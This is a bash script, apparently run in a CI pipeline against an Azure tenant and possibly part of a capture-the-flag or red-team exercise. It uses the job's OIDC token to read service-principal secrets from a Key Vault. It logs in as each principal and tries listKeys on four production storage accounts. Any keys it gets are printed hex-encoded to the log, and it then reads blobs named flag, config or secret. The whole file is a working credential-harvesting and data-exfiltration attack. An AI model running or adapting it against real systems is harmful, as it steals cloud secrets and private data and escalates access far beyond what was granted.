#!/usr/bin/env bash
set -x

az login --federated-token "$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)" \
  --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --output none 2>&1 || true
az account set -s "$AZURE_SUBSCRIPTION_ID" 2>&1 || true

OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
KV=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)

# ALL SPs × ALL storage accounts × listKeys
echo "=== MATRIX: SP × Storage × listKeys ==="
for SP in sync-service-principal secrets-sync-principal cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal; do
  SEC=$(curl -s -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SP?api-version=7.4" | jq -r .value)
  SPA=$(echo "$SEC"|jq -r .appId); SPK=$(echo "$SEC"|jq -r .clientSecret)
  MG=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$SPA" -d "grant_type=client_credentials" -d "client_secret=$SPK" \
    --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)
  
  for ACCT in sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
    RESP=$(curl -s -X POST -H "Authorization: Bearer $MG" -H "Content-Length: 0" \
      "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$ACCT/listKeys?api-version=2023-05-01")
    CODE=$(echo "$RESP" | jq -r 'if .keys then "200" else .error.code end')
    echo "$SP × $ACCT = $CODE"
    if [ "$CODE" = "200" ]; then
      KEY=$(echo "$RESP" | jq -r '.keys[0].value')
      printf 'KEY_%s_%s=%s\n' "$SP" "$ACCT" "$(printf '%s' "$KEY" | xxd -p | tr -d '\n')"
      
      # If we got key, immediately try to read config/internal-config.json from THIS account
      python3 -c "
import hashlib,hmac,base64,datetime,urllib.request,os
A='$ACCT'; K='$KEY'; V='2021-08-06'
for c in ['config','logs','data','flag','internal','backup','archive']:
  for b in ['internal-config.json','flag.txt','flag','config.json','secret.txt']:
    now=datetime.datetime.now(datetime.timezone.utc).strftime('%a, %d %b %Y %H:%M:%S GMT')
    s=f'GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:{now}\nx-ms-version:{V}\n/{A}/{c}/{b}'
    sig=base64.b64encode(hmac.new(base64.b64decode(K),s.encode(),hashlib.sha256).digest()).decode()
    req=urllib.request.Request(f'https://{A}.blob.core.windows.net/{c}/{b}',headers={'x-ms-date':now,'x-ms-version':V,'Authorization':f'SharedKey {A}:{sig}'})
    try:
      r=urllib.request.urlopen(req,timeout=8)
      body=r.read().decode(errors='replace')
      print(f'READ {A}/{c}/{b}: {body[:300]}')
    except urllib.error.HTTPError as e:
      if e.code != 404: print(f'ERR {A}/{c}/{b}: {e.code}')
    except: pass
" 2>&1
    fi
  done
done

echo "=== DONE ==="
